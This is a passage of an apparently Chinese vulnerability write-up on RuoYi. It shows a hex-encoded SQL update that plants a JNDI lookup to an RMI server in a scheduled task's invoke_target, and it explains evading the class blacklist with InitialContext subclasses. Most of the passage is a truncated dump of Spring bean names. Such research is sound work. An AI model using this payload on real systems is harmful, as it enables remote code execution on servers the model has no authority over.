src="image-20241026224026324.png" alt="image-20241026224026324"></p><p>执行sql语句</p><p><img src="image-20241026224039450.png" alt="image-20241026224039450"></p><p>无敌</p><p>也就是空insert或者update设置一下invoke_target就行了</p><p>可以给一个提示，我们知道javax.naming.InitialContext 经常在黑名单中，其实可以用它的子类来进行绕过</p><p><img src="image-20241026231352728.png" alt="image-20241026231352728"></p><p>javax.naming.directory.InitialDirContext</p><p>javax.naming.ldap.InitialLdapContext</p><p>都是可以的，这样轻松就绕过黑名单了</p><p><img src="image-20241026231726022.png" alt="image-20241026231726022"></p><p>转hex</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">genTableServiceImpl.createTable(<span class="hljs-string">&#x27;UPDATE sys_job SET invoke_target = 0x6a617661782e6e616d696e672e6c6461702e496e697469616c4c646170436f6e746578742e6c6f6f6b75702827726d693a2f2f3132372e302e302e313a313039372f6578702729 WHERE job_id = 1;&#x27;</span>)<br></code></pre></td></tr></table></figure><p>执行后 </p><p><img src="image-20241026232044514.png" alt="image-20241026232044514"></p><p>id为1的已修改完成，然后执行就行。</p><p>这里只能通过SpringUtils.getBean(beanName); 触发，不能放射调用, 没有构造方法.</p><h3 id="4-7-9"><a href="#4-7-9" class="headerlink" title="4.7.9"></a>4.7.9</h3><p><img src="image-20241027000801430.png" alt="image-20241027000801430"></p><p>白名单，没得玩</p><p>在就是1day，ThymeleafSSTI。</p><h3 id="省流"><a href="#省流" class="headerlink" title="省流"></a>省流</h3><p><strong>定时任务调用任意pubilic类的punlic方法，方法限制string，int，duble，long的类型</strong></p><p><strong>或者通过springbean，给到一个bean对象，然后调用bean里的public方法，参数限制同上</strong></p><p>bean主要有下面，对应的类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br></pre></td><td class="code"><pre><code class="hljs java">result = &#123;HashMap@<span class="hljs-number">22309</span>&#125;  size = <span class="hljs-number">505</span><br> <span class="hljs-string">&quot;apiModelSpecificationReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.scanners.ApiModelSpecificationReader&quot;</span><br> <span class="hljs-string">&quot;sysUserOnlineController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.monitor.SysUserOnlineController$$EnhancerBySpringCGLIB$$5c42ec&quot;</span><br> <span class="hljs-string">&quot;com.alibaba.druid.spring.boot.autoconfigure.DruidDataSourceAutoConfigure&quot;</span> -&gt; <span class="hljs-string">&quot;com.alibaba.druid.spring.boot.autoconfigure.DruidDataSourceAutoConfigure$$EnhancerBySpringCGLIB$$73829ca1&quot;</span><br> <span class="hljs-string">&quot;commonController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.common.CommonController&quot;</span><br> <span class="hljs-string">&quot;serviceModelToSwagger2MapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.mappers.ServiceModelToSwagger2MapperImpl&quot;</span><br> <span class="hljs-string">&quot;fieldProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.property.field.FieldProvider&quot;</span><br> <span class="hljs-string">&quot;apiListingReferenceScanner&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.scanners.ApiListingReferenceScanner&quot;</span><br> <span class="hljs-string">&quot;parameterMultiplesReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.parameter.ParameterMultiplesReader&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.MultipartAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.MultipartAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;sqlSessionFactory&quot;</span> -&gt; <span class="hljs-string">&quot;org.apache.ibatis.session.defaults.DefaultSqlSessionFactory&quot;</span><br> <span class="hljs-string">&quot;jdbcTemplate&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.jdbc.core.JdbcTemplate&quot;</span><br> <span class="hljs-string">&quot;sysDictTypeMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy300&quot;</span><br> <span class="hljs-string">&quot;org.springframework.context.annotation.internalConfigurationAnnotationProcessor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.context.annotation.ConfigurationClassPostProcessor&quot;</span><br> <span class="hljs-string">&quot;securityManager&quot;</span> -&gt; <span class="hljs-string">&quot;org.apache.shiro.web.mgt.DefaultWebSecurityManager&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.aop.AopAutoConfiguration$AspectJAutoProxyingConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.aop.AopAutoConfiguration$AspectJAutoProxyingConfiguration&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration$EnableTransactionManagementConfiguration$CglibAutoProxyConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.transaction.TransactionAutoConfiguration$EnableTransactionManagementConfiguration$CglibAutoProxyConfiguration&quot;</span><br> <span class="hljs-string">&quot;sysCaptchaController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.system.SysCaptchaController&quot;</span><br> <span class="hljs-string">&quot;pathMappingDecorator&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.paths.PathMappingDecorator&quot;</span><br> <span class="hljs-string">&quot;beanNameViewResolver&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.view.BeanNameViewResolver&quot;</span><br> <span class="hljs-string">&quot;queryStringUriTemplateDecorator&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.paths.QueryStringUriTemplateDecorator&quot;</span><br> <span class="hljs-string">&quot;apiModelTypeNameProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.schema.ApiModelTypeNameProvider&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration$ThymeleafWebMvcConfiguration$ThymeleafViewResolverConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.thymeleaf.ThymeleafAutoConfiguration$ThymeleafWebMvcConfiguration$ThymeleafViewResolverConfiguration&quot;</span><br> <span class="hljs-string">&quot;viewResolver&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.web.servlet.view.ContentNegotiatingViewResolver&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.devtools.autoconfigure.LocalDevToolsAutoConfiguration$LiveReloadConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.devtools.autoconfigure.LocalDevToolsAutoConfiguration$LiveReloadConfiguration&quot;</span><br> <span class="hljs-string">&quot;permitAllUrlProperties&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.config.properties.PermitAllUrlProperties$$EnhancerBySpringCGLIB$$5ba1efce&quot;</span><br> <span class="hljs-string">&quot;defaults&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spi.service.contexts.Defaults&quot;</span><br> <span class="hljs-string">&quot;tomcatServletWebServerFactoryCustomizer&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.TomcatServletWebServerFactoryCustomizer&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;removeDruidFilterRegistrationBean&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.web.servlet.FilterRegistrationBean&quot;</span><br> <span class="hljs-string">&quot;springfox.boot.starter.autoconfigure.SwaggerUiWebMvcConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.boot.starter.autoconfigure.SwaggerUiWebMvcConfiguration$$EnhancerBySpringCGLIB$$2a8d6f2c&quot;</span><br> <span class="hljs-string">&quot;shiroDialect&quot;</span> -&gt; <span class="hljs-string">&quot;at.pollux.thymeleaf.shiro.dialect.ShiroDialect&quot;</span><br> <span class="hljs-string">&quot;server-org.springframework.boot.autoconfigure.web.ServerProperties&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.ServerProperties&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.quartz.QuartzAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.quartz.QuartzAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;openApiOperationTagsReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.OpenApiOperationTagsReader&quot;</span><br> <span class="hljs-string">&quot;messageConverters&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.http.HttpMessageConverters&quot;</span><br> <span class="hljs-string">&quot;styleEnumMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.oas.mappers.StyleEnumMapperImpl&quot;</span><br> <span class="hljs-string">&quot;websocketServletWebServerCustomizer&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.websocket.servlet.TomcatWebSocketServletWebServerCustomizer&quot;</span><br> <span class="hljs-string">&quot;genConfig&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.generator.config.GenConfig&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.h2.H2ConsoleAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.h2.H2ConsoleAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;pathDecoratorRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.sql.init.SqlInitializationAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.sql.init.SqlInitializationAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;dataSourceScriptDatabaseInitializer&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.jdbc.init.DataSourceScriptDatabaseInitializer&quot;</span><br> <span class="hljs-string">&quot;genTableColumnServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.generator.service.impl.GenTableColumnServiceImpl&quot;</span><br> <span class="hljs-string">&quot;apiListingReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.scanners.ApiListingReader&quot;</span><br> <span class="hljs-string">&quot;sysConfigServiceImpl&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.system.service.impl.SysConfigServiceImpl&quot;</span><br> <span class="hljs-string">&quot;mbeanExporter&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.jmx.export.annotation.AnnotationMBeanExporter&quot;</span><br> <span class="hljs-string">&quot;sysOperlogController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.monitor.SysOperlogController$$EnhancerBySpringCGLIB$$b9f5c3d4&quot;</span><br> <span class="hljs-string">&quot;operationHttpMethodReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger.readers.operation.OperationHttpMethodReader&quot;</span><br> <span class="hljs-string">&quot;modelMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.mappers.ModelMapperImpl&quot;</span><br> <span class="hljs-string">&quot;operationBuilderPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;defaultResponseTypeReader&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.plugins.DefaultResponseTypeReader&quot;</span><br> <span class="hljs-string">&quot;dynamicDataSource&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.datasource.DynamicDataSource&quot;</span><br> <span class="hljs-string">&quot;druidController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.monitor.DruidController$$EnhancerBySpringCGLIB$$cd2a234e&quot;</span><br> <span class="hljs-string">&quot;jsonIgnorePropertiesModelPlugin&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.plugins.JsonIgnorePropertiesModelPlugin&quot;</span><br> <span class="hljs-string">&quot;mbeanServer&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.jmx.mbeanserver.JmxMBeanServer&quot;</span><br> <span class="hljs-string">&quot;sysUserMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy289&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.context.internalConfigurationPropertiesBinder&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.context.properties.ConfigurationPropertiesBinder&quot;</span><br> <span class="hljs-string">&quot;sysDictDataController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.system.SysDictDataController$$EnhancerBySpringCGLIB$$3053a47&quot;</span><br> <span class="hljs-string">&quot;onlineSessionFactory&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.shiro.session.OnlineSessionFactory&quot;</span><br> <span class="hljs-string">&quot;defaultsProviderPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span class="hljs-string">&quot;parameterMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.swagger2.mappers.ParameterMapperImpl&quot;</span><br> <span class="hljs-string">&quot;webServerFactoryCustomizerBeanPostProcessor&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.web.server.WebServerFactoryCustomizerBeanPostProcessor&quot;</span><br> <span class="hljs-string">&quot;ruoYiConfig&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.common.config.RuoYiConfig&quot;</span><br> <span class="hljs-string">&quot;oasVendorExtensionsMapperImpl&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.oas.mappers.OasVendorExtensionsMapperImpl&quot;</span><br> <span class="hljs-string">&quot;modelAttributeParameterExpander&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.readers.parameter.ModelAttributeParameterExpander&quot;</span><br> <span class="hljs-string">&quot;parameterMinMax&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.parameter.MinMaxAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.websocket.servlet.WebSocketServletAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.websocket.servlet.WebSocketServletAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;parameterNotBlank&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.parameter.NotBlankAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;schemaPluginsManager&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.plugins.SchemaPluginsManager&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jdbc.JdbcTemplateAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.jdbc.JdbcTemplateAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.devtools.autoconfigure.LocalDevToolsAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.devtools.autoconfigure.LocalDevToolsAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;cacheController&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.web.controller.monitor.CacheController$$EnhancerBySpringCGLIB$$cfb112ce&quot;</span><br> <span class="hljs-string">&quot;sysLoginService&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.shiro.service.SysLoginService&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.availability.ApplicationAvailabilityAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.availability.ApplicationAvailabilityAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;sysDictDataMapper&quot;</span> -&gt; <span class="hljs-string">&quot;com.sun.proxy.$Proxy299&quot;</span><br> <span class="hljs-string">&quot;config&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.web.service.ConfigService&quot;</span><br> <span class="hljs-string">&quot;apiDescriptionLookup&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.spring.web.scanners.ApiDescriptionLookup&quot;</span><br> <span class="hljs-string">&quot;parameterPattern&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.bean.validators.plugins.parameter.PatternAnnotationPlugin&quot;</span><br> <span class="hljs-string">&quot;captchaConfig&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.config.CaptchaConfig$$EnhancerBySpringCGLIB$$a92653d3&quot;</span><br> <span class="hljs-string">&quot;sysRegisterService&quot;</span> -&gt; <span class="hljs-string">&quot;com.ruoyi.framework.shiro.service.SysRegisterService&quot;</span><br> <span class="hljs-string">&quot;accessorsProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.property.bean.AccessorsProvider&quot;</span><br> <span class="hljs-string">&quot;getEhCacheManager&quot;</span> -&gt; <span class="hljs-string">&quot;org.apache.shiro.cache.ehcache.EhCacheManager&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.aop.AopAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.aop.AopAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;cachingModelPropertiesProvider&quot;</span> -&gt; <span class="hljs-string">&quot;springfox.documentation.schema.property.CachingModelPropertiesProvider&quot;</span><br> <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.ServletWebServerFactoryAutoConfiguration&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.boot.autoconfigure.web.servlet.ServletWebServerFactoryAutoConfiguration&quot;</span><br> <span class="hljs-string">&quot;apiListingScannerPluginRegistry&quot;</span> -&gt; <span class="hljs-string">&quot;org.springframework.plugin.core.OrderAwarePluginRegistry&quot;</span><br> <span 